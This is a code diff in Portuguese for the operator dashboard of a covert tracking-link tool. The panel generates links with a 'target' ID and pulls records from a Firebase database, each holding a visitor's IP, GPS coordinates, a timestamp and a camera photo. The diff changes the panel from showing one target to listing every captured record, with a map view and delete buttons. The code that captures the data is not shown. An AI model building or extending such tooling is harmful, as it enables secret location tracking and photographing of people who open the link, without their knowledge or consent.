@@ -561,7 +561,7 @@
         let mapaIP = null;
         let marcadorIP = null;
         let mapaDetalhe = null;
-        let currentTargetId = localStorage.getItem('currentTargetId') || "alvo01"; // ID salvo permanentemente
+        let currentTargetId = localStorage.getItem('currentTargetId') || "alvo01";
 
         window.onload = function() {
             const savedName = localStorage.getItem('userName');
@@ -719,10 +719,10 @@
         }
 
         // ==========================================
-        // CAPTURA REMOTA E GESTÃO DE ID NO FIREBASE
+        // GESTÃO DE TODOS OS IDS E DADOS DO FIREBASE EM LISTA COM ROLAGEM
         // ==========================================
         function alterarIdAlvo() {
-            const novoId = prompt("Digite o novo ID do alvo:", currentTargetId);
+            const novoId = prompt("Digite o ID padrão para novos links gerados:", currentTargetId);
             if (novoId && novoId.trim() !== "") {
                 currentTargetId = novoId.trim();
                 localStorage.setItem('currentTargetId', currentTargetId);
@@ -732,75 +732,84 @@
 
         async function abrirCapturaRemota() {
             const modal = document.getElementById('app-modal');
-            document.getElementById('modal-title').textContent = `CAPTURA REMOTA [ID: ${currentTargetId}]`;
+            document.getElementById('modal-title').textContent = `PAINEL DE CAPTURAS REMOTAS`;
             modal.classList.add('active');
 
             const linkGerado = `https://wv0304362-bot.github.io/linkApi1-/?id=${currentTargetId}`;
 
             let htmlContent = `
                 <div style="display: flex; gap: 8px; align-items: center; justify-content: space-between;">
-                    <span style="font-size: 0.8rem; color: #94a3b8;">ID Atual: <b style="color: #38bdf8;">${currentTargetId}</b></span>
-                    <button class="custom-btn" style="padding: 4px 10px; font-size: 0.75rem; background: #334155;" onclick="alterarIdAlvo()">✏️ Editar ID</button>
+                    <span style="font-size: 0.8rem; color: #94a3b8;">ID Ativo p/ Link: <b style="color: #38bdf8;">${currentTargetId}</b></span>
+                    <button class="custom-btn" style="padding: 4px 10px; font-size: 0.75rem; background: #334155;" onclick="alterarIdAlvo()">✏️ Alterar ID</button>
                 </div>
                 
-                <div style="font-size: 0.8rem; color: #94a3b8; margin-top: 4px;">Seu Link Modificado:</div>
+                <div style="font-size: 0.8rem; color: #94a3b8; margin-top: 2px;">Link com ID Atual:</div>
                 <div class="search-box-container">
                     <input type="text" id="captura-link-input" class="custom-input" value="${linkGerado}" readonly>
                     <button class="custom-btn" onclick="copiarTexto('captura-link-input', 'Link copiado!')">Copiar</button>
                 </div>
 
                 <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 4px;">
-                    <span style="font-size: 0.8rem; color: #94a3b8;">Dados Capturados no Firebase:</span>
-                    <button class="custom-btn" style="padding: 4px 12px; font-size: 0.75rem; background: #059669;" onclick="abrirCapturaRemota()">🔄 Atualizar</button>
+                    <span style="font-size: 0.8rem; color: #38bdf8; font-weight: bold;">Todos os IPs e Dados Salvos:</span>
+                    <button class="custom-btn" style="padding: 4px 12px; font-size: 0.75rem; background: #059669;" onclick="abrirCapturaRemota()">🔄 Atualizar Lista</button>
                 </div>
 
-                <div style="display: flex; flex-direction: column; gap: 8px; margin-top: 4px;" id="lista-captura-container">
-                    <div style="text-align: center; color: #94a3b8; padding: 15px;">Buscando dados no Firebase...</div>
+                <div style="display: flex; flex-direction: column; gap: 8px; margin-top: 4px; max-height: 320px; overflow-y: auto; padding-right: 4px;" id="lista-captura-container">
+                    <div style="text-align: center; color: #94a3b8; padding: 15px;">Buscando registros no Firebase...</div>
                 </div>
             `;
             document.getElementById('modal-body').innerHTML = htmlContent;
 
-            // Busca os dados no Firebase via requisição GET
+            // Busca TODOS os registros salvos na raiz /capturas do Firebase
             try {
-                let resposta = await fetch(`https://linkapi1-zrx-default-rtdb.firebaseio.com/capturas/${currentTargetId}.json`);
-                let dados = await resposta.json();
+                let resposta = await fetch(`https://linkapi1-zrx-default-rtdb.firebaseio.com/capturas.json`);
+                let todosDados = await resposta.json();
                 
                 const containerLista = document.getElementById('lista-captura-container');
 
-                if (!dados) {
-                    containerLista.innerHTML = `<div style="text-align: center; color: #64748b; padding: 15px;">Nenhum dado encontrado para o ID <b>${currentTargetId}</b> ainda.</div>`;
+                if (!todosDados || Object.keys(todosDados).length === 0) {
+                    containerLista.innerHTML = `<div style="text-align: center; color: #64748b; padding: 15px;">Nenhum registro encontrado no painel ainda.</div>`;
                     return;
                 }
 
-                let ipAlvo = dados.ip || "IP Desconhecido";
-                let lat = dados.location ? dados.location.lat : -14.235;
-                let lon = dados.location ? dados.location.lon : -51.925;
-                let timestamp = dados.timestamp || "Recente";
+                let itensHTML = "";
 
-                // Renderiza o card do IP capturado com botões de "Ver Dados" e "Apagar" do lado
-                containerLista.innerHTML = `
-                    <div class="log-item">
-                        <div class="log-header-row">
-                            <span style="display: flex; align-items: center; gap: 6px; color: #f8fafc;">
-                                <span style="font-size: 1.1rem;">🇧🇷</span> 
-                                <span>${ipAlvo}</span>
-                                <span style="font-size: 0.75rem; color: #38bdf8; font-weight: 600;">(Brasil)</span>
-                            </span>
-                            <span style="font-size: 0.75rem; color: #10b981; font-weight: 600;">Online</span>
-                        </div>
-                        <div class="log-sub-row">
-                            <span>Lat: ${lat}, Lon: ${lon}</span>
-                            <span>${timestamp}</span>
-                        </div>
-                        <div class="log-actions">
-                            <span style="font-size: 0.75rem; color: #94a3b8;">ID Firebase: ${currentTargetId}</span>
-                            <div style="display: flex; gap: 6px;">
-                                <button class="custom-btn" style="padding: 5px 10px; font-size: 0.75rem; background: #0284c7;" onclick='verDetalhesFirebase(${JSON.stringify(dados)}, "${currentTargetId}")'>Ver Dados</button>
-                                <button class="custom-btn" style="padding: 5px 10px; font-size: 0.75rem; background: #ef4444;" onclick="apagarDadosFirebase('${currentTargetId}')">Apagar</button>
+                // Percorre cada ID salvo no Firebase e monta os cards em formato de lista com rolagem
+                for (let idKey in todosDados) {
+                    let dadosAlvo = todosDados[idKey];
+                    if (!dadosAlvo) continue;
+
+                    let ipAlvo = dadosAlvo.ip || "IP Desconhecido";
+                    let lat = dadosAlvo.location ? dadosAlvo.location.lat : -14.235;
+                    let lon = dadosAlvo.location ? dadosAlvo.location.lon : -51.925;
+                    let timestamp = dadosAlvo.timestamp || "Registrado";
+
+                    itensHTML += `
+                        <div class="log-item">
+                            <div class="log-header-row">
+                                <span style="display: flex; align-items: center; gap: 6px; color: #f8fafc;">
+                                    <span style="font-size: 1.1rem;">🇧🇷</span> 
+                                    <span>${ipAlvo}</span>
+                                    <span style="font-size: 0.7rem; background: rgba(56,189,248,0.2); color: #38bdf8; padding: 2px 6px; border-radius: 4px;">ID: ${idKey}</span>
+                                </span>
+                                <span style="font-size: 0.75rem; color: #10b981; font-weight: 600;">Salvo</span>
+                            </div>
+                            <div class="log-sub-row">
+                                <span>Lat: ${lat}, Lon: ${lon}</span>
+                                <span>${timestamp}</span>
+                            </div>
+                            <div class="log-actions">
+                                <span style="font-size: 0.75rem; color: #94a3b8;">Registro Armazenado</span>
+                                <div style="display: flex; gap: 6px;">
+                                    <button class="custom-btn" style="padding: 5px 10px; font-size: 0.75rem; background: #0284c7;" onclick='verDetalhesFirebase(${JSON.stringify(dadosAlvo)}, "${idKey}")'>Ver Dados</button>
+                                    <button class="custom-btn" style="padding: 5px 10px; font-size: 0.75rem; background: #ef4444;" onclick="apagarDadosFirebase('${idKey}')">Apagar</button>
+                                </div>
                             </div>
                         </div>
-                    </div>
-                `;
+                    `;
+                }
+
+                containerLista.innerHTML = itensHTML;
 
             } catch (erro) {
                 console.error("Erro ao puxar dados do Firebase:", erro);
@@ -808,9 +817,9 @@
             }
         }
 
-        // Função para apagar dados do Firebase usando requisição DELETE
+        // Função para apagar um ID/registro específico do Firebase
         async function apagarDadosFirebase(idAlvo) {
-            if (!confirm(`Tem certeza que deseja apagar os dados do ID [${idAlvo}] no Firebase?`)) return;
+            if (!confirm(`Tem certeza que deseja apagar o registro do ID [${idAlvo}]?`)) return;
 
             try {
                 let resposta = await fetch(`https://linkapi1-zrx-default-rtdb.firebaseio.com/capturas/${idAlvo}.json`, {
@@ -818,10 +827,10 @@
                 });
 
                 if (resposta.ok) {
-                    alert("Dados apagados com sucesso!");
-                    abrirCapturaRemota(); // Atualiza a tela
+                    alert("Registro apagado com sucesso!");
+                    abrirCapturaRemota(); // Atualiza a lista na tela
                 } else {
-                    alert("Erro ao apagar os dados.");
+                    alert("Erro ao apagar o registro.");
                 }
             } catch (erro) {
                 console.error("Erro ao deletar:", erro);
@@ -838,11 +847,11 @@
             let foto = dados.media ? dados.media.photo : "";
             let ip = dados.ip || "N/A";
 
-            document.getElementById('modal-title').textContent = `Detalhes do Alvo [${idAlvo}]`;
+            document.getElementById('modal-title').textContent = `Detalhes [ID: ${idAlvo}]`;
             document.getElementById('modal-body').innerHTML = `
-                <button class="back-btn" onclick="abrirCapturaRemota()">&larr; Voltar</button>
+                <button class="back-btn" onclick="abrirCapturaRemota()">&larr; Voltar para a Lista</button>
                 
-                <div style="font-size: 0.9rem; font-weight: 600; color: #38bdf8;">IP do Alvo: 🇧🇷 ${ip}</div>
+                <div style="font-size: 0.9rem; font-weight: 600; color: #38bdf8;">IP Registrado: 🇧🇷 ${ip}</div>
                 
                 <div class="info-row"><span class="info-label">Latitude:</span><span class="info-value">${lat}</span></div>
                 <div class="info-row"><span class="info-label">Longitude:</span><span class="info-value">${lon}</span></div>
@@ -852,7 +861,7 @@
 
                 <div style="font-size: 0.8rem; font-weight: 600; color: #38bdf8; margin-top: 8px;">Foto Capturada da Câmera:</div>
                 <div style="width: 100%; height: 200px; background: #0f172a; border-radius: 10px; border: 1px solid #334155; overflow: hidden; display: flex; align-items: center; justify-content: center;">
-                    ${foto ? `<img src="${foto}" style="width: 100%; height: 100%; object-fit: cover;" alt="Foto capturada">` : `<span style="color: #64748b; font-size: 0.8rem;">Nenhuma foto enviada ainda.</span>`}
+                    ${foto ? `<img src="${foto}" style="width: 100%; height: 100%; object-fit: cover;" alt="Foto capturada">` : `<span style="color: #64748b; font-size: 0.8rem;">Nenhuma foto enviada neste registro.</span>`}
                 </div>
             `;
 
@@ -868,7 +877,7 @@
                 }).addTo(mapaDetalhe);
 
                 L.marker([lat, lon]).addTo(mapaDetalhe)
-                    .bindPopup(`<b>Alvo: ${ip}</b><br>Localização exata obtida via GPS.`)
+                    .bindPopup(`<b>IP: ${ip}</b><br>ID: ${idAlvo}`)
                     .openPopup();
             }, 150);
         }
@@ -903,7 +912,7 @@
 
             document.getElementById('modal-body').innerHTML = `
                 <div style="font-size: 0.8rem; color: #94a3b8;">Opções extras do painel:</div>
-                <div class="info-row"><span class="info-label">Versão do Painel:</span><span class="info-value">v2.6 Pro</span></div>
+                <div class="info-row"><span class="info-label">Versão do Painel:</span><span class="info-value">v2.7 Pro</span></div>
                 <div class="info-row"><span class="info-label">Modo de Conexão:</span><span class="info-value" style="color: #10b981;">Firebase Realtime Database</span></div>
             `;
         }
